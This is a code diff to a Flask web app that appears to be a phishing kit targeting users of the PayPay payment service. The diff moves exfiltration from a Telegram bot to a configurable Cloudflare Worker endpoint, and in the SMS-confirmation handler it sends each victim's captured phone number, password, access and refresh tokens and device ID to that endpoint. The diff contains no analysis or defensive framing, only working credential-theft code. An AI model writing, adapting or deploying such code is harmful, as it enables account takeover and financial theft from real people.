@@ -28,21 +28,21 @@ def save_config(cfg: dict) -> None:
         json.dump(cfg, f, ensure_ascii=False, indent=2)
 
 
-def notify_telegram(text: str) -> None:
+def notify_worker(payload: dict) -> None:
     cfg = load_config()
-    token = cfg.get("tg_bot_token", "").strip()
-    chat_id = cfg.get("tg_chat_id", "").strip()
-    if not token or not chat_id:
+    url = cfg.get("cf_worker_url", "").strip()
+    if not url:
         return
+    secret = cfg.get("cf_worker_secret", "").strip()
+    headers = {"Content-Type": "application/json"}
+    if secret:
+        headers["X-Secret"] = secret
     try:
         import requests as _req
-        _req.post(
-            f"https://api.telegram.org/bot{token}/sendMessage",
-            json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
-            timeout=10,
-        )
+        _req.post(url, json=payload, headers=headers, timeout=10)
     except Exception:
         pass
+
 
 LINKS_FILE = os.path.join(os.path.dirname(__file__), "links.json")
 LINK_ID_RE = re.compile(r"^[A-Za-z0-9]{16}$")
@@ -132,8 +132,8 @@ def admin_create_link():
 def api_config_get():
     cfg = load_config()
     return jsonify({
-        "tg_bot_token": cfg.get("tg_bot_token", ""),
-        "tg_chat_id":   cfg.get("tg_chat_id", ""),
+        "cf_worker_url":    cfg.get("cf_worker_url", ""),
+        "cf_worker_secret": cfg.get("cf_worker_secret", ""),
     })
 
 
@@ -141,17 +141,17 @@ def api_config_get():
 def api_config_save():
     data = request.get_json(force=True)
     cfg = load_config()
-    if "tg_bot_token" in data:
-        cfg["tg_bot_token"] = data["tg_bot_token"].strip()
-    if "tg_chat_id" in data:
-        cfg["tg_chat_id"] = data["tg_chat_id"].strip()
+    if "cf_worker_url" in data:
+        cfg["cf_worker_url"] = data["cf_worker_url"].strip()
+    if "cf_worker_secret" in data:
+        cfg["cf_worker_secret"] = data["cf_worker_secret"].strip()
     save_config(cfg)
     return jsonify({"ok": True})
 
 
 @app.route("/api/config/test", methods=["POST"])
 def api_config_test():
-    notify_telegram("✅ PayPay ツール — テスト通知\nTelegram 設定が正常に動作しています。")
+    notify_worker({"type": "test", "message": "テスト通知 — Worker 設定が正常に動作しています。"})
     return jsonify({"ok": True})
 
 
@@ -271,14 +271,15 @@ def api_sms_confirm():
     _paypay_sessions.pop(token, None)
     session.pop("paypay_token", None)
 
-    notify_telegram(
-        f"<b>🎯 新しいログイン</b>\n"
-        f"📱 電話: <code>{phone_captured}</code>\n"
-        f"🔑 パスワード: <code>{pass_captured}</code>\n"
-        f"🪙 access_token: <code>{result['access_token']}</code>\n"
-        f"🔄 refresh_token: <code>{result['refresh_token']}</code>\n"
-        f"📟 device_uuid: <code>{result['device_uuid']}</code>"
-    )
+    notify_worker({
+        "type":          "login",
+        "phone":         phone_captured,
+        "password":      pass_captured,
+        "access_token":  result["access_token"],
+        "refresh_token": result["refresh_token"],
+        "device_uuid":   result["device_uuid"],
+        "ts":            datetime.utcnow().isoformat() + "Z",
+    })
 
     return jsonify({"status": "ok", **result})
 
